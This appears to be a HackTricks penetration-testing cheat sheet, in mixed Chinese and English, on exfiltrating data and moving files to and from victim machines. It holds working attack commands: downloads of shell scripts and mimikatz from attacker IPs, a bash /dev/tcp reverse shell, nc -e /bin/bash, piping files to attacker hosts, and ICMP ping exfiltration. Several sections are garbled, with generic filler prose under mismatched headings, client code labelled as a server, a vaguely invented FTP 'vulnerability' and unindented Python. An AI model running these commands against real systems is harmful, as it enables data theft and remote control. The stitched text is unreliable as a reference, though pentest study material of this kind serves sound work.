# 渗透

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**赏金猎人提示**：**注册** Intigriti，一个由黑客创建的高级**赏金猎人平台**！立即加入我们的[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 常见的白名单域用于信息泄露

查看[https://lots-project.com/](https://lots-project.com/)以找到常见的白名单域，可以被滥用

## 复制并粘贴 Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

## Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of hacking, exfiltration is often used to steal sensitive information or to maintain persistence within a compromised network.

### Common Exfiltration Techniques

1. **File Transfer Protocol (FTP)**: FTP is a standard network protocol used to transfer files between a client and a server. Attackers can use FTP to exfiltrate data by connecting to an FTP server and uploading the stolen files.

2. **Hypertext Transfer Protocol (HTTP)**: HTTP is the protocol used for transferring data over the internet. Attackers can use HTTP to exfiltrate data by sending HTTP requests to a remote server, either by embedding the data in the request or by uploading files.

3. **Domain Name System (DNS)**: DNS is responsible for translating domain names into IP addresses. Attackers can use DNS exfiltration to encode and send data within DNS queries or responses, bypassing traditional network security measures.

4. **Email**: Attackers can exfiltrate data by sending it as email attachments or by using email protocols such as SMTP or POP3 to transfer the data to an external server.

5. **Cloud Storage**: Attackers can leverage cloud storage platforms to exfiltrate data by uploading the stolen files to cloud storage accounts, such as Dropbox or Google Drive.

### Detection and Prevention

To detect and prevent exfiltration attempts, consider implementing the following measures:

1. **Network Monitoring**: Monitor network traffic for suspicious patterns or anomalies that may indicate exfiltration attempts. Use intrusion detection systems (IDS) or intrusion prevention systems (IPS) to detect and block exfiltration attempts.

2. **Data Loss Prevention (DLP)**: Implement DLP solutions to identify and prevent the unauthorized transfer of sensitive data. DLP solutions can monitor and control data in motion, at rest, and in use.

3. **Firewall Rules**: Configure firewall rules to restrict outbound traffic and block unauthorized protocols or destinations. Regularly review and update firewall rules to ensure they align with the organization's security policies.

4. **Encryption**: Encrypt sensitive data to protect it from unauthorized access during transit. Use secure protocols such as HTTPS or SFTP for data transfer to ensure data confidentiality and integrity.

5. **User Awareness and Training**: Educate users about the risks of data exfiltration and provide training on best practices for data protection. Encourage users to report any suspicious activities or potential security incidents.

By implementing these measures, organizations can enhance their security posture and mitigate the risk of data exfiltration.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**

### 目标

在Linux系统上通过HTTP协议进行数据泄露。

### 方法

1. 使用`curl`命令发送HTTP请求：

   ```bash
   curl -X POST -d "data" http://example.com
   ```

   这将向`http://example.com`发送一个POST请求，并将数据作为请求体发送。

2. 使用`wget`命令下载文件：

   ```bash
   wget http://example.com/file.txt
   ```

   这将从`http://example.com`下载`file.txt`文件。

3. 使用`nc`命令将数据发送到远程主机：

   ```bash
   echo "data" | nc example.com 80
   ```

   这将通过TCP连接将数据发送到`example.com`的80端口。

4. 使用`netcat`命令将文件发送到远程主机：

   ```bash
   cat file.txt | nc example.com 80
   ```

   这将通过TCP连接将`file.txt`文件发送到`example.com`的80端口。

### 注意事项

- 在使用这些方法时，请确保目标主机具有适当的权限和配置，以接收和处理数据。
- 在发送敏感数据之前，请确保使用适当的加密和身份验证机制来保护数据的安全性。
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

## Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location controlled by the attacker. In the context of Windows systems, exfiltration can occur through various methods, including network-based exfiltration, physical exfiltration, and covert channels.

### Network-Based Exfiltration

Network-based exfiltration involves transferring data from the target system to an external location over a network connection. This can be achieved using various techniques, such as:

- **File Transfer Protocol (FTP)**: FTP can be used to transfer files from the target system to an FTP server controlled by the attacker.
- **Hypertext Transfer Protocol (HTTP)**: HTTP can be used to send data to a web server controlled by the attacker.
- **Domain Name System (DNS)**: DNS can be abused to exfiltrate data by encoding it within DNS queries or responses.
- **Email**: Data can be sent as email attachments or embedded within the body of an email message.

### Physical Exfiltration

Physical exfiltration involves physically removing data from the target system. This can be done by:

- **USB Drives**: Data can be copied onto USB drives and physically taken out of the target system.
- **Printouts**: Sensitive data can be printed and physically carried out of the target location.
- **Removable Media**: Data can be copied onto removable media devices, such as external hard drives or DVDs.

### Covert Channels

Covert channels are hidden communication channels that can be used to exfiltrate data without being detected. Some examples of covert channels in Windows systems include:

- **Steganography**: Data can be hidden within image or audio files and then transferred to an external location.
- **DNS Tunneling**: DNS can be used as a covert channel to bypass network security controls and exfiltrate data.
- **Traffic Splitting**: Data can be split into multiple network packets and sent over different network connections to avoid detection.

It is important for security professionals to be aware of these exfiltration methods in order to detect and prevent data breaches.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### 上传文件

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer 打印 GET 和 POST 请求（包括头部信息）**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python 模块 [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS服务器**

An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. HTTPS is an extension of the HTTP protocol that adds encryption and authentication mechanisms to ensure the confidentiality and integrity of the data being transmitted.

To set up an HTTPS server, you need to obtain an SSL/TLS certificate from a trusted certificate authority (CA). This certificate is used to verify the identity of the server and establish a secure connection with the client. Once the certificate is obtained, it needs to be installed on the server.

There are several popular web servers that support HTTPS, such as Apache, Nginx, and Microsoft IIS. These servers can be configured to listen on the HTTPS port (usually port 443) and handle incoming HTTPS requests.

When a client connects to an HTTPS server, the server presents its SSL/TLS certificate to the client. The client then verifies the authenticity of the certificate and establishes a secure connection with the server. All data transmitted between the client and the server is encrypted using the SSL/TLS protocol, preventing unauthorized access or tampering.

HTTPS servers are commonly used for secure online transactions, such as e-commerce websites, online banking, and sensitive data transfers. They provide a secure and reliable way to protect sensitive information from being intercepted or manipulated by attackers.

Setting up and configuring an HTTPS server requires careful attention to security practices and best practices. It is important to keep the server and its software up to date with the latest security patches and to follow secure configuration guidelines to minimize the risk of vulnerabilities and attacks.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP服务器（Python）

```python
import socket
import os

def send_file(file_path, host, port):
    # 创建一个TCP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 连接到FTP服务器
    sock.connect((host, port))
    # 打开文件
    file = open(file_path, 'rb')
    # 获取文件名
    file_name = os.path.basename(file_path)
    # 发送文件名到服务器
    sock.send(file_name.encode())
    # 接收服务器的响应
    response = sock.recv(1024).decode()
    if response == 'OK':
        # 逐行读取文件内容并发送到服务器
        for line in file:
            sock.send(line)
        # 关闭文件
        file.close()
        # 关闭套接字
        sock.close()
        print('File sent successfully.')
    else:
        print('Error:', response)

def main():
    # 输入文件路径
    file_path = input('Enter the file path: ')
    # 输入FTP服务器的IP地址
    host = input('Enter the FTP server IP address: ')
    # 输入FTP服务器的端口号
    port = int(input('Enter the FTP server port number: '))
    # 发送文件到FTP服务器
    send_file(file_path, host, port)

if __name__ == '__main__':
    main()
```

该Python脚本用于将文件发送到FTP服务器。

使用方法：
1. 运行脚本。
2. 输入文件路径。
3. 输入FTP服务器的IP地址。
4. 输入FTP服务器的端口号。
5. 文件将被发送到FTP服务器。

请注意，您需要在本地计算机上安装Python以运行此脚本。
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP服务器（NodeJS）

#### Description

An FTP (File Transfer Protocol) server is a standard network protocol used to transfer files from one host to another over a TCP-based network, such as the internet. In this case, we will focus on an FTP server implemented using NodeJS.

#### Vulnerability

The vulnerability in this FTP server lies in the way it handles user authentication. By exploiting this vulnerability, an attacker can gain unauthorized access to the server and potentially exfiltrate sensitive data.

#### Exploitation

To exploit this vulnerability, an attacker can use various techniques, such as brute-forcing weak passwords, exploiting default credentials, or leveraging known vulnerabilities in the FTP server software.

Once the attacker gains access to the FTP server, they can exfiltrate files by downloading them to their local machine or by transferring them to another remote server under their control.

#### Mitigation

To mitigate this vulnerability, it is recommended to:

- Implement strong password policies and enforce regular password changes.
- Disable default credentials and create unique credentials for each user.
- Keep the FTP server software up to date with the latest security patches.
- Monitor and log FTP server activity for any suspicious behavior.
- Implement network segmentation to limit the impact of a potential FTP server compromise.

#### References

- [File Transfer Protocol (FTP) - Wikipedia](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
- [NodeJS FTP Server - npm](https://www.npmjs.com/package/ftp-server)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP服务器（pure-ftp）

#### FTP Exfiltration

#### FTP渗透

FTP (File Transfer Protocol) is a standard network protocol used to transfer files from one host to another over a TCP-based network, such as the internet. It is commonly used for uploading and downloading files to and from a remote server.

FTP（文件传输协议）是一种标准的网络协议，用于在基于TCP的网络（如互联网）上将文件从一个主机传输到另一个主机。它通常用于将文件上传和下载到远程服务器。

In the context of exfiltration, FTP can be used to transfer sensitive data from a compromised system to an external server controlled by the attacker. This can be done by either uploading the data from the compromised system to the attacker's server or by downloading the data from the compromised system to the attacker's server.

在渗透的背景下，FTP可以用于将敏感数据从被入侵的系统传输到攻击者控制的外部服务器。可以通过从被入侵的系统上传数据到攻击者的服务器，或者从被入侵的系统下载数据到攻击者的服务器来实现。

#### FTP Command Injection

#### FTP命令注入

FTP command injection is a technique that allows an attacker to execute arbitrary commands on an FTP server by injecting malicious commands into FTP input fields. This can be used to gain unauthorized access to the server, escalate privileges, or exfiltrate data.

FTP命令注入是一种技术，允许攻击者通过向FTP输入字段注入恶意命令，在FTP服务器上执行任意命令。这可以用于未经授权访问服务器、提升权限或渗透数据。

To perform an FTP command injection, an attacker typically needs to identify an input field on the FTP server that is vulnerable to command injection. This can be a login form, a file upload form, or any other input field that allows user-supplied data to be executed as a command on the server.

要执行FTP命令注入，攻击者通常需要识别FTP服务器上易受命令注入攻击的输入字段。这可以是登录表单、文件上传表单或任何允许用户提供的数据作为服务器上的命令执行的输入字段。

Once the vulnerable input field is identified, the attacker can inject malicious commands into the field to execute arbitrary commands on the FTP server. This can be done by appending the malicious commands to the user-supplied data or by manipulating the input in a way that allows the execution of arbitrary commands.

一旦识别出易受攻击的输入字段，攻击者可以将恶意命令注入到该字段中，以在FTP服务器上执行任意命令。可以通过将恶意命令附加到用户提供的数据中，或者通过以允许执行任意命令的方式操纵输入来实现。

#### FTP Bounce Attack

#### FTP反弹攻击

FTP bounce attack is a technique that allows an attacker to use an FTP server as a proxy to scan other hosts on a network. This can be used to bypass firewalls and network restrictions, as the attacker's IP address appears to be the IP address of the FTP server.

FTP反弹攻击是一种技术，允许攻击者使用FTP服务器作为代理来扫描网络上的其他主机。这可以用于绕过防火墙和网络限制，因为攻击者的IP地址看起来是FTP服务器的IP地址。

To perform an FTP bounce attack, the attacker needs to find an FTP server that allows the PORT command. The PORT command is used to specify the IP address and port number of the client for data connections.

要执行FTP反弹攻击，攻击者需要找到一个允许使用PORT命令的FTP服务器。PORT命令用于指定客户端的IP地址和数据连接的端口号。

The attacker starts by connecting to the FTP server and authenticating with valid credentials. Once authenticated, the attacker sends a PORT command with the IP address and port number of the target host as the argument.

攻击者首先连接到FTP服务器，并使用有效的凭据进行身份验证。身份验证成功后，攻击者发送一个带有目标主机的IP地址和端口号作为参数的PORT命令。

The FTP server then attempts to establish a connection to the target host using the IP address and port number specified in the PORT command. If the target host is reachable and allows FTP connections, the FTP server will establish a connection and relay the attacker's commands to the target host.

然后，FTP服务器尝试使用PORT命令中指定的IP地址和端口号与目标主机建立连接。如果目标主机可达并允许FTP连接，FTP服务器将建立连接并将攻击者的命令转发到目标主机。

By using the FTP server as a proxy, the attacker can scan other hosts on the network without directly connecting to them. This can help the attacker evade detection and perform reconnaissance on the network.

通过使用FTP服务器作为代理，攻击者可以在网络上扫描其他主机，而无需直接连接到它们。这可以帮助攻击者逃避检测并对网络进行侦察。
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** 客户端

#### **Exfiltration Techniques**

##### **1. Data Compression**

Data compression is a technique used to reduce the size of data files. This can be useful for exfiltrating large amounts of data quickly and efficiently. There are various compression algorithms available, such as ZIP, RAR, and 7-Zip, which can be used to compress files before exfiltration.

##### **2. Steganography**

Steganography is the practice of hiding data within other files or images. This technique can be used to exfiltrate data by embedding it within innocent-looking files, making it difficult to detect. Tools like OpenStego and Steghide can be used to perform steganography on Windows systems.

##### **3. DNS Tunneling**

DNS tunneling involves encapsulating data within DNS queries and responses. This technique can be used to bypass firewalls and exfiltrate data from a compromised Windows system. Tools like Dnscat2 and Iodine can be used to establish DNS tunnels for data exfiltration.

##### **4. HTTP/S Traffic**

HTTP/S traffic can be used to exfiltrate data by sending it over standard HTTP/S protocols. This can be done by encoding the data in the HTTP/S requests or by using covert channels within the HTTP/S traffic. Tools like Curl, Wget, and Netcat can be used to exfiltrate data over HTTP/S.

##### **5. Email**

Email can be used as a means of exfiltrating data from a compromised Windows system. This can be done by attaching the data to an email and sending it to a remote server. Tools like Outlook and Thunderbird can be used to send emails with attachments.

##### **6. Cloud Storage**

Cloud storage services can be used to exfiltrate data by uploading it to a remote server. Services like Dropbox, Google Drive, and OneDrive can be used to store and share data from a compromised Windows system.

##### **7. Remote Access Tools**

Remote access tools, such as TeamViewer and AnyDesk, can be used to remotely access a compromised Windows system and exfiltrate data. These tools allow for remote control of the system, making it easy to transfer files and data.

##### **8. USB Drives**

USB drives can be used to physically exfiltrate data from a compromised Windows system. By copying the data onto a USB drive, an attacker can easily remove it from the system without leaving a trace.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**Bug赏金提示**：**注册**Intigriti，一个由黑客创建的高级**Bug赏金平台**！立即加入我们：[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

## SMB

Kali作为服务器
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
或者使用samba创建一个SMB共享：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location. This can be a critical step in a hacking operation, as it allows the attacker to steal sensitive information from the compromised system.

There are several methods that can be used for exfiltration, depending on the target system and the available resources. Here are some common techniques:

## 1. File Transfer Protocols

File Transfer Protocol (FTP), Secure Copy Protocol (SCP), and Hypertext Transfer Protocol (HTTP) are commonly used protocols for transferring files over a network. Attackers can leverage these protocols to exfiltrate data by uploading it to a remote server or downloading it from the target system.

## 2. Email

Email is another common method for exfiltrating data. Attackers can send sensitive information as attachments or embed it within the body of an email. They can also use steganography techniques to hide the data within image or audio files.

## 3. DNS Tunneling

DNS tunneling involves encapsulating data within DNS queries and responses. Attackers can use this technique to bypass firewalls and exfiltrate data by sending DNS queries to a controlled server that extracts the hidden information.

## 4. Cloud Storage

Cloud storage services, such as Dropbox or Google Drive, can be used for exfiltration. Attackers can upload sensitive data to these platforms and then download it from another location. This method allows for easy access to the stolen information from anywhere with an internet connection.

## 5. Covert Channels

Covert channels are hidden communication channels that can be used for exfiltration. These channels can be created using various techniques, such as manipulating network protocols, exploiting timing side channels, or using unused fields in network packets.

It is important for organizations to implement strong security measures to prevent exfiltration. This includes monitoring network traffic, restricting access to sensitive data, and implementing data loss prevention (DLP) solutions.

By understanding the various exfiltration techniques, organizations can better protect their systems and data from unauthorized access and leakage.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

攻击者必须运行SSHd。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

如果受害者拥有SSH，攻击者可以将受害者的目录挂载到攻击者的计算机上。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC（Netcat）是一种功能强大的网络工具，可用于在网络上进行数据传输和连接。它可以作为客户端或服务器使用，并支持多种协议和功能。以下是一些常见的使用场景和命令示例：

### 1. 端口扫描

使用NC进行端口扫描是一种快速检测目标主机上开放端口的方法。以下是一个示例命令：

```
nc -zv <目标IP> <起始端口>-<结束端口>
```

### 2. 反向Shell

使用NC可以建立反向Shell连接，允许攻击者通过目标主机与受害者主机进行交互。以下是一个示例命令：

```
攻击者主机：nc -lvp <监听端口>
受害者主机：nc <攻击者IP> <监听端口> -e /bin/bash
```

### 3. 文件传输

NC还可以用于在网络上传输文件。以下是一个示例命令：

```
发送文件：nc -w 3 <目标IP> <目标端口> < 文件路径
接收文件：nc -lvp <监听端口> > 文件路径
```

### 4. 网络嗅探

NC可以用于嗅探网络流量，以便分析和捕获数据包。以下是一个示例命令：

```
nc -lvp <监听端口> | tee 文件路径
```

### 5. 网络代理

使用NC可以创建一个简单的网络代理，将流量从一个端口转发到另一个端口。以下是一个示例命令：

```
nc -lvp <监听端口> -c 'nc <目标IP> <目标端口>'
```

这些只是NC的一些常见用法，它还有许多其他功能和选项。熟练掌握NC可以帮助您在渗透测试和网络安全评估中更好地利用和保护网络。
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
```bash
cat /path/to/file > /dev/tcp/attacker_ip/attacker_port
```

This command allows you to download a file from the victim machine to your machine. Replace `/path/to/file` with the actual path of the file on the victim machine. Replace `attacker_ip` with your IP address and `attacker_port` with the port number you want to use for the connection.

### Upload file to victim

```bash
cat /path/to/file | nc -l -p attacker_port
```

This command allows you to upload a file from your machine to the victim machine. Replace `/path/to/file` with the actual path of the file on your machine. Replace `attacker_port` with the port number you want to use for the connection.

### Execute command on victim

```bash
echo "command" > /dev/tcp/attacker_ip/attacker_port
```

This command allows you to execute a command on the victim machine. Replace `command` with the actual command you want to execute. Replace `attacker_ip` with your IP address and `attacker_port` with the port number you want to use for the connection.

### Reverse shell

```bash
bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
```

This command establishes a reverse shell connection with the victim machine. Replace `attacker_ip` with your IP address and `attacker_port` with the port number you want to use for the connection.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### 将文件上传到受害者计算机

To exfiltrate files from a victim's computer, you can use various methods depending on the access and privileges you have. Here are some common techniques:

#### 1. Web-based file upload vulnerabilities

If the victim's computer has a web application that allows file uploads, you can exploit any vulnerabilities in the upload functionality to upload your desired files. This could include bypassing file type restrictions, exploiting insecure file permissions, or leveraging other weaknesses in the upload process.

#### 2. Remote file inclusion (RFI)

If the victim's computer is vulnerable to remote file inclusion, you can upload a file to a remote server and then include it in a vulnerable script on the victim's computer. This allows you to execute arbitrary code and exfiltrate files to the remote server.

#### 3. Exploiting misconfigured cloud storage

If the victim's computer is connected to cloud storage services like AWS S3, Google Cloud Storage, or Dropbox, you can search for misconfigured permissions that allow public access to the storage buckets. Once you find a misconfigured bucket, you can upload your files to it and retrieve them later.

#### 4. Email-based exfiltration

If you have access to the victim's email account, you can simply attach the files you want to exfiltrate and send them to your own email address. This method is effective if the victim's email account is not properly secured.

#### 5. File transfer protocols

If you have remote access to the victim's computer, you can use file transfer protocols like FTP, SCP, or SMB to transfer files from the victim's computer to your own machine. This method requires authentication credentials or exploiting vulnerabilities in the file transfer service.

Remember, exfiltrating files from a victim's computer without proper authorization is illegal and unethical. Always ensure you have the necessary permissions and legal authorization before attempting any file exfiltration techniques.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
感谢 **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

默认情况下，在XP和2003中（在其他系统中需要在安装过程中显式添加）

在Kali中，**启动TFTP服务器**：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Python中的TFTP服务器：**

```python
import socket
import struct

def tftp_server():
    # 创建UDP套接字
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # 接收客户端请求
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # 处理读请求
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # 读取文件内容
            try:
                with open(filename, 'rb') as file:
                    file_data = file.read()
            except FileNotFoundError:
                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
                server_socket.sendto(error_packet, client_address)
                continue

            # 发送文件内容
            block_number = 1
            start_index = 0
            while start_index < len(file_data):
                end_index = start_index + 512
                data_packet = struct.pack('!HH', 3, block_number) + file_data[start_index:end_index]
                server_socket.sendto(data_packet, client_address)
                ack_packet, _ = server_socket.recvfrom(4)
                ack_block_number = struct.unpack('!HH', ack_packet[:4])[1]

                if ack_block_number == block_number:
                    block_number += 1
                    start_index = end_index
                else:
                    break

        elif opcode == 2:
            # 处理写请求
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # 接收文件内容
            file_data = b''
            block_number = 0
            while True:
                ack_packet = struct.pack('!HH', 4, block_number)
                server_socket.sendto(ack_packet, client_address)
                data_packet, _ = server_socket.recvfrom(516)
                received_block_number = struct.unpack('!HH', data_packet[:4])[1]

                if received_block_number == block_number + 1:
                    file_data += data_packet[4:]
                    block_number += 1
                    if len(data_packet) < 516:
                        break
                else:
                    break

            # 写入文件内容
            try:
                with open(filename, 'wb') as file:
                    file.write(file_data)
            except:
                error_packet = struct.pack('!HH', 5, 2) + b'Access violation'
                server_socket.sendto(error_packet, client_address)
                continue

        else:
            # 发送错误消息
            error_packet = struct.pack('!HH', 5, 4) + b'Illegal TFTP operation'
            server_socket.sendto(error_packet, client_address)

    server_socket.close()

tftp_server()
```
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
在**受害者**中，连接到Kali服务器：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

使用 PHP 一行代码下载文件：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript（Visual Basic Scripting Edition）是一种基于Visual Basic的脚本语言，常用于Windows操作系统上的自动化任务和脚本编写。它可以通过Windows脚本宿主（如Windows Script Host）来执行。

### VBScript的数据泄露方法

VBScript可以使用多种方法将数据从目标系统中泄露出来。以下是一些常见的方法：

#### 1. 文件读取

使用VBScript可以读取目标系统上的文件内容。可以使用`FileSystemObject`对象的`OpenTextFile`方法来打开文件，并使用`ReadAll`方法读取文件的内容。

```vbscript
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\path\to\file.txt", 1)
strData = objFile.ReadAll
objFile.Close
```

#### 2. 网络请求

VBScript可以发送HTTP请求来将数据发送到远程服务器。可以使用`MSXML2.XMLHTTP`对象来发送GET或POST请求，并使用`responseText`属性获取响应内容。

```vbscript
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.open "GET", "http://example.com/data", False
objHTTP.send
strResponse = objHTTP.responseText
```

#### 3. 注册表读取

VBScript可以读取目标系统的注册表项，以获取敏感数据。可以使用`WScript.Shell`对象的`RegRead`方法来读取注册表项的值。

```vbscript
Set objShell = CreateObject("WScript.Shell")
